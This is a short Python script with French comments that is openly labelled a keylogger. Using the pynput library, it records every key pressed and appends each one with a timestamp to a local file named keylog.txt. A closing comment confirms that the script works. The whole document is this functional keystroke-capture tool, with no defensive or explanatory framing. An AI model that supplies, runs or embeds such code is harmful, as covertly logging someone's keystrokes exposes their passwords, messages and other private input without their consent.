from pynput.keyboard import Listener
import logging

logging.basicConfig(
    filename="keylog.txt",  # Nom du fichier où les frappes seront stockées
    level=logging.INFO,     # Niveau de journalisation
    format="%(asctime)s: %(message)s"  # Format des entrées avec date et heure
)

def on_press(key):
    try:
        logging.info(str(key))  # Enregistre la touche dans le fichier
    except Exception as e:
        print(f"Erreur : {e}")
        
with Listener(on_press=on_press) as listener:
    print("Keylogger lancé. Appuyez sur Ctrl+C pour l'arrêter.")
    listener.join()
    # ok ça fonctionne !